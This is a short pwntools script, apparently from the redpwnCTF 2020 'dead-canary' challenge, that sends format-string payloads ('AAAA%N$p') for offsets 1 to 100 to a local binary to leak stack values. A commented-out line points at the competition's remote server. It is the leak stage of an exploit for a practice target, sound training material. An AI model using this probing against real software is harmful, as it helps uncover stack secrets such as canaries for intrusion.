from pwn import *
elf = ELF('./dead-canary', checksec=False)

for x in range(1, 101):
    with context.local(log_level = 'error'):
        p = elf.process()
        #p = remote('2020.redpwnc.tf', 31744)
        p.sendlineafter(b'name:',  'AAAA%{:d}$p'.format(x))      
        print(x,p.recvline_contains('Hello').split(b' ')[-1])
        p.close()
#p.interactive()